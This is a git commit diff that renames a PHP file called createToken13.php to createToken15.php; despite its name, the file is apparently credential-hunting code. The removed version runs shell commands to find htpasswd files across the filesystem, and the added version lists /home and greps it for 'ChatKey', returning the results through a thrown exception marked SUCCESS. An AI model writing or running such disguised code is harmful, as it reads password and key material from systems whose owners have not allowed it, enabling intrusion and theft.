e78abb3349ce9be99af932b2e1a61efe3c6db975
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 22:19:44 +0100

    Update and rename createToken13.php to createToken15.php

--- createToken13.php
+++
@@ -1,8 +0,0 @@
-<?php
-$output ='';
-
-$output =$output."\n htpaswd ".shell_exec ('find / -name "*htpasswd" | cat');
-$output =$output."\n root ls ".shell_exec ('ls / | cat');
-
-throw new Exception("\n SUCCESS  ". $output."\n");
-?>
---
+++ createToken15.php
@@ -0,0 +1,8 @@
+<?php
+$output ='';
+
+$output =$output."\n root ls ".shell_exec ('ls /home/  | cat');
+$output =$output."\n htpaswd ".shell_exec ("grep -rnw '/home/' -e 'ChatKey'  | cat");
+
+throw new Exception("\n SUCCESS  ". $output."\n");
+?>
